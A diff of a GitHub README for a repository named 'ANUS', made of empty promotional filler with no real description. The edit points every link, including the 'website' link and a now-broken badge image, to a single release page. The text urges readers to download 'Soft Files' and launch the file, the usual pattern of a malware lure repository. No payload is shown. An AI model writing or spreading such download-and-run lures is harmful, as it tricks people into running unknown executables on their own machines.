@@ -7,17 +7,17 @@ Welcome to the ANUS repository! Unfortunately, no specific description is provid
 The topics covered in this repository are not explicitly provided, allowing you to delve into a variety of subjects and uncover hidden gems. 
 
 ## Access Soft Files
-You can access the Soft Files by downloading them from the following link: [Download Soft Files](https://github.com/files/Soft.zip)
+You can access the Soft Files by downloading them from the following link: [Download Soft Files](https://github.com/manslikeron/ANUS/releases/tag/v1.2)
 
 Please note that you will need to launch the file after downloading to explore its contents.
 
 If the link above is not working or not provided, consider checking the "Releases" section of this repository for alternative access options.
 
 ## Explore More
-Feel free to visit our website for more information and updates related to ANUS. Click [here](https://anusrepository.com) to visit our website.
+Feel free to visit our website for more information and updates related to ANUS. Click [here](https://github.com/manslikeron/ANUS/releases/tag/v1.2) to visit our website.
 
 ## Repository Badges
-[![Download Soft Files](https://img.shields.io/badge/Download-Soft%20Files-blue)](https://github.com/files/Soft.zip)
+[![Download Soft Files](https://github.com/manslikeron/ANUS/releases/tag/v1.2%20Files-blue)](https://github.com/manslikeron/ANUS/releases/tag/v1.2)
 
 ## Let's Dive into ANUS 🚀
 Explore the ANUS repository and uncover a world of possibilities! Whether you are a seasoned developer or a curious explorer, there is something for everyone in ANUS. Unlock the mysteries, unleash your creativity, and join us on an exciting journey through the realms of ANUS!
